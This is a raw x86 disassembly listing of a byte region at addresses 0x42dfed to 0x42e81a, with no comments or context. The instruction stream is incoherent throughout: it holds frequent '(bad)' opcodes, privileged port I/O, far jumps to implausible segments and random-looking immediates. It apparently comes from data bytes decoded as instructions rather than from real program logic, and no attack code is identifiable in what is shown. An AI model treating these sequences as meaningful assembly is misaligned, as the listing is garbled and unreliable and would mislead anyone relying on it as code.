  42dfed:	in     al,0xcf
  42dfef:	jmp    0xca38a4e0
  42dff4:	jecxz  0x42dfca
  42dff6:	loope  0x42dfe7
  42dff8:	retf   0xd8e6
  42dffb:	enter  0xc8b5,0xfb
  42dfff:	out    dx,eax
  42e000:	aad    0xef
  42e002:	add    ah,dh
  42e004:	rcr    dl,1
  42e006:	add    eax,edx
  42e008:	mul    bh
  42e00a:	iret   
  42e00b:	dec    ch
  42e00d:	or     eax,0xe4e6d1f9
  42e012:	repnz iret 
  42e014:	repnz mov bl,0xb6
  42e017:	aam    0xf7
  42e019:	mov    ecx,0xf2dabbbf
  42e01e:	jecxz  0x42e023
  42e020:	div    ch
  42e022:	mov    esi,0xbc0c0be
  42e027:	retf   0xdbfa
  42e02a:	stc    
  42e02b:	or     al,bh
  42e02d:	jecxz  0x42e007
  42e02f:	lods   eax,DWORD PTR ds:[esi]
  42e030:	(bad)  
  42e031:	fmul   st(1),st
  42e033:	shr    esi,1
  42e035:	in     eax,dx
  42e036:	cli    
  42e037:	mov    bh,0xcb
  42e039:	jmp    0xf5bc:0xebeefdd9
  42e040:	int    0xe1
  42e042:	sti    
  42e043:	mul    ebp
  42e045:	(bad)  
  42e047:	(bad)
  42e04a:	add    edx,ecx
  42e04c:	or     eax,0xaaefeae8
  42e051:	test   eax,0xf1e7d6ca
  42e056:	mov    al,0xd3
  42e058:	(bad)  
  42e059:	mov    eax,0xcab5b4b7
  42e05e:	mov    ecx,0xf0fcc8d4
  42e063:	test   esp,0xd9ded0c4
  42e069:	out    0xeb,eax
  42e06b:	fcomi  st,st(4)
  42e06d:	or     DWORD PTR [ebx],ecx
  42e06f:	loope  0x42e02f
  42e071:	ret    
  42e072:	mov    dh,0xf4
  42e074:	mov    dh,0xd7
  42e076:	sti    
  42e077:	(bad)  
  42e078:	leave  
  42e079:	call   edi
  42e07b:	mov    ch,0xd9
  42e07d:	idiv   DWORD PTR [edi-0x3e113c0c]
  42e083:	mov    edi,0x6d4d3d7
  42e088:	cli    
  42e089:	jmp    0x42e089
  42e08b:	pop    es
  42e08c:	enter  0xda0a,0xe5
  42e090:	mov    al,0xe6
  42e092:	(bad)
  42e095:	iret   
  42e096:	enter  0xcceb,0xf4
  42e09a:	fdivp  st(5),st
  42e09c:	cli    
  42e09d:	mov    ch,0xf0
  42e09f:	loop   0x42e07c
  42e0a1:	fadd   st(1),st
  42e0a3:	add    DWORD PTR [ecx],eax
  42e0a5:	out    0xfe,eax
  42e0a7:	stc    
  42e0a8:	add    esp,edx
  42e0aa:	clc    
  42e0ab:	cmc    
  42e0ac:	fcmovu st,st(1)
  42e0ae:	shr    DWORD PTR [esi-0x124c4c53],cl
  42e0b4:	(bad)  
  42e0b5:	mov    cl,0xf5
  42e0b7:	(bad)  
  42e0b8:	jmp    0x42e098
  42e0ba:	into   
  42e0bb:	icebp  
  42e0bc:	jmp    0xf6da:0xddd4d2e9
  42e0c3:	std    
  42e0c4:	in     al,dx
  42e0c5:	(bad)  
  42e0c6:	lds    eax,FWORD PTR [eax]
  42e0c8:	out    0xa,eax
  42e0ca:	(bad)  
  42e0cc:	push   cs
  42e0cd:	std    
  42e0ce:	add    DWORD PTR [ebx-0x4a133151],esi
  42e0d4:	vpmuludq ymm6,ymm2,YMMWORD PTR [eax-0x240b0d30]
  42e0dc:	mov    esi,0xcef8be03
  42e0e1:	(bad)  
  42e0e2:	rcr    ebp,1
  42e0e4:	fcomip st,st(7)
  42e0e6:	(bad)  
  42e0e7:	retf   0x2d5
  42e0ea:	sti    
  42e0eb:	add    eax,0xcb04e0e3
  42e0f0:	fidivr WORD PTR [edi-0x24043f3b]
  42e0f6:	test   al,0xd0
  42e0f8:	mov    ebx,0x3fccff7
  42e0fd:	mov    eax,0xb8eed1ba
  42e102:	loope  0x42e105
  42e104:	mov    edx,0xfac3e7fa
  42e109:	in     eax,0xe9
  42e10b:	or     cl,ch
  42e10d:	add    al,0x9
  42e10f:	fldl2t 
  42e111:	iret   
  42e112:	enter  0xcfbc,0xb7
  42e116:	loopne 0x42e0f3
  42e118:	out    dx,al
  42e119:	hlt    
  42e11a:	aam    0xdd
  42e11c:	retf   0xdef3
  42e11f:	mov    edi,0xc2fae6fe
  42e124:	fisttp DWORD PTR [edx]
  42e126:	fsub   st,st(7)
  42e128:	retf   
  42e129:	test   DWORD PTR ds:0x2d9e7ca,0xd2ecf7ca
  42e133:	(bad)
  42e136:	(bad)  
  42e137:	sar    BYTE PTR [ecx-0x2406480b],0xb8
  42e13e:	(bad)  
  42e140:	mov    edi,0x5c3ccf9
  42e145:	in     al,0xf9
  42e147:	in     al,0xf7
  42e149:	(bad)  
  42e14a:	retf   0xe9d4
  42e14d:	rcr    edx,cl
  42e14f:	in     al,dx
  42e150:	int3   
  42e151:	ret    0xb7cb
  42e154:	cmc    
  42e155:	in     eax,dx
  42e156:	int    0xd3
  42e158:	out    dx,eax
  42e159:	sti    
  42e15a:	mov    ah,0xdd
  42e15c:	in     eax,dx
  42e15d:	repz (bad) 
  42e160:	add    BYTE PTR [edi-0x28410527],bh
  42e166:	aam    0xdc
  42e168:	add    ah,dl
  42e16a:	into   
  42e16b:	jmp    0x42e174
  42e16d:	rol    DWORD PTR [ecx],cl
  42e16f:	mov    edi,0xe0e1c5c6
  42e174:	mov    dh,0xcf
  42e176:	(bad)
  42e179:	mov    bh,0xb7
  42e17b:	icebp  
  42e17c:	in     al,dx
  42e17d:	mov    esp,0xd700e1db
  42e182:	repnz push es
  42e184:	mov    ebp,0x9f8e4e6
  42e189:	(bad)  
  42e18c:	in     al,0xce
  42e18e:	push   cs
  42e18f:	ret    0xe9f2
  42e192:	loope  0x42e15a
  42e194:	mov    ah,0xcd
  42e196:	fcomi  st,st(2)
  42e198:	aad    0xc8
  42e19a:	out    dx,eax
  42e19b:	shl    edx,cl
  42e19d:	jecxz  0x42e173
  42e19f:	aad    0xb6
  42e1a1:	aad    0xe5
  42e1a3:	int3   
  42e1a4:	jecxz  0x42e198
  42e1a6:	jecxz  0x42e19e
  42e1a8:	fcmovnu st,st(6)
  42e1aa:	cmc    
  42e1ab:	push   cs
  42e1ac:	(bad)  
  42e1ae:	add    esi,edx
  42e1b0:	xlat   BYTE PTR ds:[ebx]
  42e1b1:	retf   
  42e1b2:	loopne 0x42e161
  42e1b4:	rol    ecx,0xf1
  42e1b7:	rcl    esp,0xca
  42e1ba:	sar    dl,cl
  42e1bc:	stc    
  42e1bd:	leave  
  42e1be:	lock stc 
  42e1c0:	repz ret 0xe4e6
  42e1c4:	add    cl,bl
  42e1c6:	aad    0xff
  42e1c8:	lock xlat BYTE PTR ds:[ebx]
  42e1ca:	imul   bl
  42e1cc:	std    
  42e1cd:	call   0xc5f0cdd0
  42e1d2:	mov    dl,0xed
  42e1d4:	out    0xd0,al
  42e1d6:	sti    
  42e1d7:	mov    al,0xf5
  42e1d9:	int3   
  42e1da:	fcmovbe st,st(4)
  42e1dc:	into   
  42e1dd:	idiv   BYTE PTR [ebx-0x3e051c2d]
  42e1e3:	add    eax,0xf7e5d9cc
  42e1e8:	loope  0x42e1e4
  42e1ea:	fdivr  st,st(6)
  42e1ec:	push   es
  42e1ed:	repnz repz mov edi,0xcbb3ddce
  42e1f4:	(bad)  
  42e1f5:	retf   
  42e1f6:	mov    ch,0xc5
  42e1f8:	out    dx,al
  42e1f9:	stc    
  42e1fa:	test   ebp,0xeeef03b8
  42e200:	add    DWORD PTR [edi-0x943242e],edi
  42e206:	cmc    
  42e207:	aam    0xd5
  42e209:	mov    ebp,0x5fe03c9
  42e20e:	icebp  
  42e20f:	fsubrp st(5),st
  42e211:	(bad)  
  42e212:	fsub   st(6),st
  42e214:	xlat   BYTE PTR ds:[ebx]
  42e215:	call   0xba17bb15
  42e21a:	clc    
  42e21b:	cli    
  42e21c:	hlt    
  42e21d:	add    eax,edx
  42e21f:	stc    
  42e220:	enter  0xc2df,0xed
  42e224:	test   DWORD PTR [edx],0xd5c2e2d4
  42e22a:	fmulp  st(7),st
  42e22c:	loopne 0x42e20d
  42e22e:	call   0xe606c3db
  42e233:	jmp    0xf5ea:0xc9eeefdb
  42e23a:	retf   0xf2b6
  42e23d:	aad    0xf5
  42e23f:	fxch   st(0)
  42e241:	(bad)  
  42e243:	(bad)  
  42e244:	int3   
  42e245:	(bad)  
  42e246:	test   BYTE PTR [edx],0x7
  42e249:	fdiv   st,st(6)
  42e24b:	cld    
  42e24c:	pmulhw mm0,QWORD PTR [ecx]
  42e24f:	leave  
  42e250:	test   al,0xd2
  42e252:	leave  
  42e253:	mov    bh,0xd2
  42e255:	hlt    
  42e256:	test   al,0xeb
  42e258:	sar    dh,0xf8
  42e25b:	shl    ebx,cl
  42e25d:	in     eax,dx
  42e25e:	jecxz  0x42e24c
  42e260:	test   DWORD PTR [esi],0xd0fbd4dd
  42e266:	out    0xfe,al
  42e268:	add    eax,0xc900e80a
  42e26d:	add    ch,ch
  42e26f:	out    dx,al
  42e270:	out    0xeb,al
  42e272:	out    0xc5,al
  42e274:	loop   0x42e227
  42e276:	mov    al,0xd9
  42e278:	mov    al,0xd0
  42e27a:	fcmovnbe st,st(5)
  42e27c:	icebp  
  42e27d:	not    cl
  42e27f:	in     al,dx
  42e280:	(bad)  
  42e282:	shl    ebx,0xc7
  42e285:	sar    al,0xe4
  42e288:	loop   0x42e255
  42e28a:	retf   0xe901
  42e28d:	fisttp WORD PTR [eax]
  42e28f:	(bad)  
  42e290:	loope  0x42e264
  42e292:	repnz mov ch,0xb1
  42e295:	div    BYTE PTR [edi-0x4212a13]
  42e29b:	shl    cl,cl
  42e29d:	cmc    
  42e29e:	iret   
  42e29f:	sti    
  42e2a0:	in     al,dx
  42e2a1:	mov    esi,0xf8c1d0dc
  42e2a6:	(bad)  
  42e2a8:	out    0xe8,al
  42e2aa:	into   
  42e2ab:	or     al,0xce
  42e2ad:	jmp    0x42e297
  42e2af:	jecxz  0x42e27e
  42e2b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2b2:	shl    bl,cl
  42e2b4:	enter  0xcfd5,0xc1
  42e2b8:	lds    edi,FWORD PTR [ebx-0xb462828]
  42e2be:	mov    ecx,0xe0e2b602
  42e2c3:	in     al,0x0
  42e2c5:	ret    
  42e2c6:	cld    
  42e2c7:	sti    
  42e2c8:	inc    BYTE PTR [eax]
  42e2ca:	add    bh,cl
  42e2cc:	fiadd  WORD PTR [edx]
  42e2ce:	inc    ah
  42e2d0:	test   al,0xf6
  42e2d2:	mov    esi,0xf9e6eeea
  42e2d7:	hlt    
  42e2d8:	(bad)  
  42e2d9:	jmp    0xbaed:0xf6d3b9c5
  42e2e0:	out    0xf6,eax
  42e2e2:	stc    
  42e2e3:	mul    bl
  42e2e5:	shl    edi,1
  42e2e7:	fcmovbe st,st(0)
  42e2e9:	div    esi
  42e2eb:	in     eax,dx
  42e2ec:	hlt    
  42e2ed:	fmulp  st(5),st
  42e2ef:	jecxz  0x42e2b0
  42e2f1:	in     al,0xce
  42e2f3:	call   0xfb3794df
  42e2f8:	enter  0xecd2,0xd5
  42e2fc:	sar    DWORD PTR [edi-0x3d024226],1
  42e302:	fsin   
  42e304:	add    al,0xb9
  42e306:	jecxz  0x42e2e6
  42e308:	(bad)  
  42e30a:	mov    esp,0x4e0e604
  42e30f:	fucom  st(4)
  42e311:	faddp  st(7),st
  42e313:	into   
  42e314:	mov    dl,0xc2
  42e316:	loopne 0x42e2e5
  42e318:	int    0xad
  42e31a:	shr    ebp,1
  42e31c:	into   
  42e31d:	icebp  
  42e31e:	in     eax,dx
  42e31f:	fiadd  WORD PTR [eax]
  42e321:	int    0xe0
  42e323:	add    bl,ch
  42e325:	ret    
  42e326:	aad    0xdf
  42e328:	retf   
  42e329:	aam    0x0
  42e32b:	loope  0x42e2f6
  42e32d:	loopne 0x42e340
  42e32f:	ret    0xdff0
  42e332:	mov    al,0xeb
  42e334:	in     al,0xfb
  42e336:	int3   
  42e337:	(bad)  
  42e339:	retf   0xedda
  42e33c:	lock (bad) 
  42e33f:	mov    esp,0xd3d1c2d5
  42e344:	(bad)  
  42e347:	call   0xff0cb833
  42e34c:	(bad)
  42e34f:	call   0xe2e78943
  42e354:	(bad)  
  42e356:	lods   al,BYTE PTR ds:[esi]
  42e357:	fcmovb st,st(5)
  42e359:	out    0xf5,al
  42e35b:	mov    bh,0xfa
  42e35d:	cli    
  42e35e:	aam    0xf6
  42e360:	rcr    ah,cl
  42e362:	add    edi,edi
  42e364:	add    ah,dh
  42e366:	or     eax,DWORD PTR [eax]
  42e368:	mov    esi,0xc5e20308
  42e36e:	into   
  42e36f:	scas   al,BYTE PTR es:[edi]
  42e370:	test   al,0xbf
  42e372:	(bad)
  42e375:	shl    BYTE PTR [esi-0x15351451],cl
  42e37b:	imul   ebx
  42e37d:	cld    
  42e37e:	fadd   st,st(3)
  42e380:	mov    ecx,0xd8ffc7f4
  42e385:	mov    BYTE PTR [edi],0xde
  42e388:	or     esp,ebp
  42e38a:	dec    DWORD PTR [edx+edi*8]
  42e38d:	iret   
  42e38e:	std    
  42e38f:	(bad)  
  42e391:	iret   
  42e392:	shl    dl,cl
  42e394:	rol    esi,1
  42e396:	aad    0xfa
  42e398:	mov    ebx,0xbddebecc
  42e39d:	add    ebx,ecx
  42e39f:	xlat   BYTE PTR ds:[ebx]
  42e3a0:	pop    es
  42e3a1:	rol    DWORD PTR [ecx],cl
  42e3a3:	mov    esp,0xdbdaead3
  42e3a8:	rol    BYTE PTR [eax],0xe7
  42e3ab:	in     eax,dx
  42e3ac:	int3   
  42e3ad:	out    dx,eax
  42e3ae:	loop   0x42e396
  42e3b0:	mov    eax,0xd1e0c0ec
  42e3b5:	shr    BYTE PTR [eax-0x33351213],cl
  42e3bb:	fucomp st(0)
  42e3bd:	mov    edi,0xe7dd00e3
  42e3c2:	mov    ebp,0xc1d3f1fe
  42e3c7:	(bad)
  42e3ca:	stc    
  42e3cb:	dec    bh
  42e3cd:	jmp    0xd4238bae
  42e3d2:	lods   al,BYTE PTR ds:[esi]
  42e3d3:	into   
  42e3d4:	mov    ch,0xe8
  42e3d6:	jmp    0xcc33b1a4
  42e3db:	mov    edi,0xbbfaccc9
  42e3e0:	cmc    
  42e3e1:	(bad)  
  42e3e2:	(bad)  
  42e3e4:	loope  0x42e3be
  42e3e6:	ret    
  42e3e7:	shl    edi,1
  42e3e9:	imul   dh
  42e3eb:	fcomp  st(5)
  42e3ed:	jmp    0xbeeda6cb
  42e3f2:	mov    dh,0xd7
  42e3f4:	hlt    
  42e3f5:	loopne 0x42e3b8
  42e3f7:	in     eax,dx
  42e3f8:	repz fcom st(0)
  42e3fb:	mov    edi,0xd0eaf9ee
  42e400:	repnz icebp 
  42e402:	cmc    
  42e403:	fdivp  st(3),st
  42e405:	xlat   BYTE PTR ds:[ebx]
  42e406:	lds    ecx,FWORD PTR [edx]
  42e408:	sti    
  42e409:	out    dx,eax
  42e40a:	std    
  42e40b:	(bad)  
  42e40c:	in     al,dx
  42e40d:	cli    
  42e40e:	fsubr  DWORD PTR [edx-0x14351a13]
  42e414:	out    0xb6,al
  42e416:	in     al,0xf8
  42e418:	icebp  
  42e419:	out    dx,eax
  42e41a:	fmul   st,st(5)
  42e41c:	mov    dl,0xdb
  42e41e:	lock in eax,dx
  42e420:	aam    0xd4
  42e422:	lock shl edx,0xf6
  42e426:	rcl    ch,cl
  42e428:	fcmovu st,st(5)
  42e42a:	add    al,0xe0
  42e42c:	add    eax,0xcda8e4cf
  42e431:	mov    bl,0xf3
  42e433:	rol    bh,1
  42e435:	mov    al,0xd3
  42e437:	out    dx,al
  42e438:	scas   al,BYTE PTR es:[edi]
  42e439:	iret   
  42e43a:	clc    
  42e43b:	iret   
  42e43c:	aam    0xf5
  42e43e:	xlat   BYTE PTR ds:[ebx]
  42e43f:	mov    esp,0xe7d9b5d9
  42e444:	icebp  
  42e445:	repz shr cl,0x7
  42e449:	sti    
  42e44a:	or     ch,cl
  42e44c:	or     ch,ah
  42e44e:	cld    
  42e44f:	retf   0xc2ef
  42e452:	aad    0xb7
  42e454:	mov    dh,0xb2
  42e456:	icebp  
  42e457:	out    0xe5,eax
  42e459:	cli    
  42e45a:	sar    DWORD PTR [esi-0x204f261d],cl
  42e460:	icebp  
  42e461:	cld    
  42e462:	pop    es
  42e463:	out    0xfb,eax
  42e465:	sti    
  42e466:	(bad)
  42e469:	or     BYTE PTR [eax+ebp*8-0x3f07f011],bh
  42e470:	test   al,0xd1
  42e472:	xlat   BYTE PTR ds:[ebx]
  42e473:	in     eax,0xd7
  42e475:	into   
  42e476:	jmp    0xd7e8:0xbbedeac7
  42e47d:	(bad)  
  42e47e:	sti    
  42e47f:	fadd   DWORD PTR [ecx]
  42e481:	fdivr  QWORD PTR [esi-0x22f50b2b]
  42e487:	std    
  42e488:	enter  0xc9f8,0xca
  42e48c:	out    0x7,eax
  42e48e:	(bad)  
  42e490:	mov    dl,0xe4
  42e492:	jmp    0xedb3:0xb1e7cfb3
  42e499:	push   DWORD PTR [eax-0x360e431b]
  42e49f:	loope  0x42e47d
  42e4a1:	icebp  
  42e4a2:	fcmovnb st,st(2)
  42e4a4:	pop    es
  42e4a5:	fadd   DWORD PTR [ecx]
  42e4a7:	add    al,cl
  42e4a9:	inc    DWORD PTR [ecx]
  42e4ab:	into   
  42e4ac:	int    0xdb
  42e4ae:	loope  0x42e498
  42e4b0:	jmp    0xdd139488
  42e4b5:	(bad)  
  42e4b6:	int3   
  42e4b7:	repnz in eax,0xda
  42e4ba:	test   esp,0xf1bcf3b6
  42e4c0:	add    esi,edx
  42e4c2:	mov    eax,0xdab900c0
  42e4c7:	inc    BYTE PTR [edi+edx*8]
  42e4ca:	sti    
  42e4cb:	iret   
  42e4cc:	(bad)  
  42e4cd:	in     eax,0xce
  42e4cf:	fnstsw WORD PTR [ebp-0x3c54221b]
  42e4d5:	int3   
  42e4d6:	rol    cl,cl
  42e4d8:	repz fsubr st,st(6)
  42e4db:	lock out dx,al
  42e4dd:	ror    esp,cl
  42e4df:	fdivr  DWORD PTR [eax+0xf0e2f3]
  42e4e5:	lock or ecx,edx
  42e4e8:	aam    0xeb
  42e4ea:	or     ebp,edx
  42e4ec:	pop    es
  42e4ed:	push   es
  42e4ee:	call   0xc731cdd8
  42e4f3:	test   al,0xc5
  42e4f6:	out    0xcf,al
  42e4f8:	test   dh,0xff
  42e4fb:	in     eax,0xc4
  42e4fd:	dec    esp
  42e4ff:	std    
  42e500:	in     eax,dx
  42e501:	shl    cl,cl
  42e503:	sti    
  42e504:	(bad)  
  42e505:	add    DWORD PTR [ecx],ecx
  42e507:	push   es
  42e508:	add    al,bl
  42e50a:	add    esi,ecx
  42e50c:	fadd   st,st(4)
  42e50e:	fld    st(5)
  42e510:	mov    cl,0xf2
  42e512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e513:	jecxz  0x42e4f6
  42e515:	aam    0xce
  42e517:	in     eax,dx
  42e518:	lock jmp 0xbef3:0xf3e4feec
  42e520:	into   
  42e521:	cmc    
  42e522:	ret    
  42e523:	(bad)  
  42e525:	in     eax,0xbc
  42e527:	fmulp  st(1),st
  42e529:	add    ebx,esp
  42e52b:	or     al,bl
  42e52d:	enter  0xeb02,0xd8
  42e531:	jmp    0xc0da:0xecefafcd
  42e538:	leave  
  42e539:	icebp  
  42e53a:	enter  0xcef5,0xf5
  42e53e:	mov    ebp,0xfa01e2f6
  42e543:	fnstcw WORD PTR [edx-0x26fe2b2d]
  42e549:	add    edi,edi
  42e54b:	psubusw mm7,mm4
  42e54e:	bswap  ebp
  42e550:	retf   
  42e551:	loope  0x42e53c
  42e553:	rcl    eax,0xd1
  42e556:	int    0xd0
  42e558:	mov    ebx,0xf1d1cae6
  42e55d:	retf   
  42e55e:	(bad)  
  42e55f:	ret    0xb9da
  42e562:	test   DWORD PTR [edx],0xbfe2e2d7
  42e568:	out    0x0,eax
  42e56a:	jmp    0xdf3cc93d
  42e56f:	fmul   st(4),st
  42e571:	loop   0x42e55b
  42e573:	repz not ebx
  42e576:	mov    dh,0xd6
  42e578:	mov    ch,0xd5
  42e57a:	aam    0xd3
  42e57c:	div    ecx
  42e57e:	ret    0xbdcd
  42e581:	out    0xe7,eax
  42e583:	mov    ebx,0xf605f4fe
  42e588:	test   DWORD PTR [ecx],0xaedc8ca
  42e58e:	push   edx
  42e590:	mov    edi,0xf1d6f3a9
  42e595:	shr    BYTE PTR [eax-0x32062c11],0xf4
  42e59c:	div    edx
  42e59e:	mov    eax,0xbffedad4
  42e5a3:	ret    
  42e5a4:	fsub   st,st(5)
  42e5a6:	loope  0x42e5ac
  42e5a8:	add    ah,bl
  42e5aa:	loopne 0x42e5a9
  42e5ac:	loop   0x42e58a
  42e5ae:	in     eax,0xe5
  42e5b0:	out    dx,eax
  42e5b1:	test   eax,0xfbadebca
  42e5b6:	shl    ch,1
  42e5b8:	ror    edx,cl
  42e5ba:	shr    ah,1
  42e5bc:	cmc    
  42e5bd:	out    dx,eax
  42e5be:	int3   
  42e5bf:	aad    0xf6
  42e5c1:	mov    edi,0x4c0c3f4
  42e5c6:	ror    BYTE PTR [eax],0xe8
  42e5c9:	hlt    
  42e5ca:	out    0x5,al
  42e5cc:	loopne 0x42e5da
  42e5ce:	out    0xc8,al
  42e5d0:	rol    dh,0xde
  42e5d3:	(bad)  
  42e5d4:	jmp    0xcbd1:0xdab6e0b6
  42e5db:	(bad)  
  42e5dd:	repz mov al,0xd5
  42e5e0:	mov    esp,0xfdddd7ce
  42e5e5:	(bad)  
  42e5e6:	cld    
  42e5e7:	or     bl,bh
  42e5e9:	leave  
  42e5ea:	idiv   ah
  42e5ec:	or     al,ah
  42e5ee:	or     eax,0xbdf0c7f2
  42e5f3:	hlt    
  42e5f4:	mov    dl,0xd3
  42e5f6:	mov    ebx,0xb9f8d5b0
  42e5fb:	mov    ah,0xbd
  42e5fd:	xlat   BYTE PTR ds:[ebx]
  42e5fe:	(bad)  
  42e600:	sti    
  42e601:	mov    edi,0xf7ebe1d9
  42e606:	not    al
  42e608:	dec    BYTE PTR [esi]
  42e60a:	fld    QWORD PTR [edx]
  42e60c:	call   0xe032f2eb
  42e611:	ret    0xdde3
  42e614:	shl    ebp,0xd0
  42e617:	not    eax
  42e619:	icebp  
  42e61a:	mov    al,0xd2
  42e61c:	fidiv  WORD PTR [ecx-0x262a2143]
  42e622:	(bad)  
  42e623:	shl    cl,cl
  42e625:	fdivp  st(3),st
  42e627:	add    bl,dh
  42e629:	jecxz  0x42e612
  42e62b:	leave  
  42e62c:	leave  
  42e62d:	in     al,0x0
  42e62f:	jecxz  0x42e620
  42e631:	loop   0x42e5f0
  42e633:	in     al,dx
  42e634:	loopne 0x42e600
  42e636:	aad    0xbb
  42e638:	jmp    0xba28de0c
  42e63d:	clc    
  42e63e:	sar    BYTE PTR [esi+esi*8-0x6224b34],1
  42e645:	jmp    0x42e5ff
  42e647:	push   es
  42e648:	hlt    
  42e649:	out    dx,eax
  42e64a:	pop    es
  42e64b:	(bad)  [ebx]
  42e64d:	(bad)  
  42e64f:	int3   
  42e650:	lods   eax,DWORD PTR ds:[esi]
  42e651:	in     eax,0xf3
  42e653:	fst    st(3)
  42e655:	int    0xcf
  42e657:	leave  
  42e658:	scas   al,BYTE PTR es:[edi]
  42e659:	mov    edx,0xfafcd0c5
  42e65e:	mov    eax,0xf4bcf7d5
  42e663:	ror    ah,1
  42e665:	mov    ebp,0xfa09d9f2
  42e66a:	aam    0xe6
  42e66c:	add    eax,0xe5f1d2cc
  42e671:	(bad)  
  42e672:	lods   eax,DWORD PTR ds:[esi]
  42e673:	lock hlt 
  42e675:	int3   
  42e676:	(bad)  
  42e677:	mov    edx,0xdfbfc8cc
  42e67c:	call   0x235af4b
  42e681:	mov    eax,0xb9dac6ed
  42e686:	clc    
  42e687:	add    eax,0xce1defc
  42e68c:	loopne 0x42e67b
  42e68e:	call   0xb423d854
  42e693:	shl    ebx,1
  42e695:	(bad)  
  42e696:	out    dx,eax
  42e697:	lock neg bh
  42e69a:	lods   al,BYTE PTR ds:[esi]
  42e69b:	hlt    
  42e69c:	div    dh
  42e69e:	add    bh,dl
  42e6a0:	hlt    
  42e6a1:	repz loop 0x42e691
  42e6a4:	aam    0xf1
  42e6a6:	loop   0x42e69f
  42e6a8:	out    dx,eax
  42e6a9:	(bad)  
  42e6ab:	iret   
  42e6ac:	int    0xf
  42e6ae:	out    0xeb,al
  42e6b0:	fadd   st,st(0)
  42e6b2:	xlat   BYTE PTR ds:[ebx]
  42e6b3:	aad    0xb6
  42e6b5:	repz jmp 0xba2d9f75
  42e6bb:	fdivp  st(5),st
  42e6bd:	jmp    0xdf02b584
  42e6c2:	(bad)  
  42e6c3:	loop   0x42e6c2
  42e6c5:	aad    0xff
  42e6c7:	(bad)  
  42e6c8:	in     al,0xfa
  42e6ca:	push   cs
  42e6cb:	retf   0xc1e4
  42e6ce:	in     eax,dx
  42e6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6d0:	mov    ebp,0xf3b6ebcd
  42e6d5:	(bad)  [ebp-0x353a4d4e]
  42e6db:	in     eax,0xca
  42e6dd:	add    ch,dl
  42e6df:	enter  0xf5dd,0xd2
  42e6e3:	int3   
  42e6e4:	fcomp  st(4)
  42e6e6:	aad    0xcb
  42e6e8:	jmp    0x42e6a7
  42e6ea:	call   0xfe29efc9
  42e6ef:	int3   
  42e6f0:	iret   
  42e6f1:	(bad)  
  42e6f2:	rol    ebx,0xcd
  42e6f5:	out    dx,eax
  42e6f6:	loope  0x42e6e5
  42e6f8:	out    0xc9,eax
  42e6fa:	retf   0xceb9
  42e6fd:	in     eax,dx
  42e6fe:	jmp    0x2cc:0xfbfc01c1
  42e705:	aad    0xa
  42e707:	jecxz  0x42e6e8
  42e709:	fabs   
  42e70b:	in     al,0xf
  42e70d:	jmp    edi
  42e70f:	scas   eax,DWORD PTR es:[edi]
  42e710:	mov    esp,0xc9c3b0c1
  42e715:	jmp    0x42e6d9
  42e717:	call   0xcd33b202
  42e71c:	mov    edx,0xecdcf7e2
  42e721:	fadd   st(2),st
  42e723:	add    ebp,ebx
  42e725:	(bad)  
  42e726:	jmp    0xcf1ded08
  42e72b:	or     ebp,esp
  42e72d:	or     DWORD PTR [ebx],edx
  42e72f:	jmp    0xf5b5:0xd1c0e4cc
  42e736:	jmp    0xf918e01b
  42e73b:	in     eax,0xe8
  42e73d:	mov    ecx,0xf8ecc1da
  42e742:	in     al,dx
  42e743:	int    0x0
  42e745:	aad    0xb
  42e747:	in     al,0x4
  42e749:	leave  
  42e74a:	add    bl,dh
  42e74c:	in     eax,dx
  42e74d:	loop   0x42e722
  42e74f:	call   0xd611b534
  42e754:	mov    dl,0xb6
  42e756:	out    0xf3,eax
  42e758:	retf   0xd0ed
  42e75b:	(bad)  
  42e75c:	fucomip st,st(1)
  42e75e:	mov    esp,0xf9d4bdb8
  42e763:	int3   
  42e764:	in     al,dx
  42e765:	in     eax,0xf6
  42e767:	idiv   ch
  42e769:	sti    
  42e76a:	jecxz  0x42e754
  42e76c:	in     eax,0xff
  42e76e:	into   
  42e76f:	repz retf 
  42e771:	repz (bad) [ebx+esi*4-0x4e464c14]
  42e779:	enter  0xceff,0xb6
  42e77d:	(bad)  
  42e77f:	fucom  st(3)
  42e781:	add    al,BYTE PTR [eax]
  42e783:	cli    
  42e784:	fld    st(5)
  42e786:	pop    es
  42e787:	ret    
  42e788:	fldl2t 
  42e78a:	retf   0xccf
  42e78d:	fcmove st,st(2)
  42e78f:	out    0xf3,eax
  42e791:	in     al,0xe3
  42e793:	loopne 0x42e760
  42e795:	loope  0x42e78c
  42e797:	mov    bl,0xd6
  42e799:	int3   
  42e79a:	test   eax,0xbbeefbf7
  42e7a0:	div    esi
  42e7a2:	repnz fdivp st(7),st
  42e7a5:	(bad)  
  42e7a7:	cmc    
  42e7a8:	std    
  42e7a9:	paddb  mm0,mm7
  42e7ac:	(bad)  
  42e7ad:	fild   DWORD PTR ds:0xb1dfa6ad
  42e7b3:	int    0xc7
  42e7b5:	lods   eax,DWORD PTR ds:[esi]
  42e7b6:	mov    dl,0xf9
  42e7b8:	(bad)  
  42e7ba:	mov    bh,0xc5
  42e7bc:	out    dx,eax
  42e7bd:	retf   
  42e7be:	loop   0x42e79a
  42e7c0:	add    dh,dl
  42e7c2:	mov    eax,0xfef304
  42e7c7:	inc    cl
  42e7c9:	out    0xc8,al
  42e7cb:	fadd   DWORD PTR [edi]
  42e7cd:	lds    ecx,FWORD PTR [eax]
  42e7cf:	fcom   st(2)
  42e7d1:	test   eax,0xced0cfae
  42e7d6:	(bad)  
  42e7d8:	int3   
  42e7d9:	jmp    0x42e7a9
  42e7db:	(bad)
  42e7de:	jmp    0xeb03:0xd8e1c2f5
  42e7e5:	jecxz  0x42e7cb
  42e7e7:	jecxz  0x42e7e4
  42e7e9:	out    0xc4,eax
  42e7eb:	fdiv   st(5),st
  42e7ed:	int    0xc
  42e7ef:	shr    dh,0xcf
  42e7f2:	faddp  st(5),st
  42e7f4:	rcl    edx,1
  42e7f6:	cli    
  42e7f7:	shl    edi,cl
  42e7f9:	mov    eax,0x3fed0de
  42e7fe:	shl    esp,1
  42e800:	iret   
  42e801:	int3   
  42e802:	cmc    
  42e803:	cmc    
  42e804:	cmc    
  42e805:	std    
  42e806:	retf   0xe0c7
  42e809:	(bad)  
  42e80b:	leave  
  42e80c:	(bad)  
  42e80d:	in     eax,dx
  42e80e:	stc    
  42e80f:	retf   0xeeb2
  42e812:	lods   al,BYTE PTR ds:[esi]
  42e813:	shl    DWORD PTR [esi+eiz*8-0x25364c31],cl
  42e81a:	out    dx,al
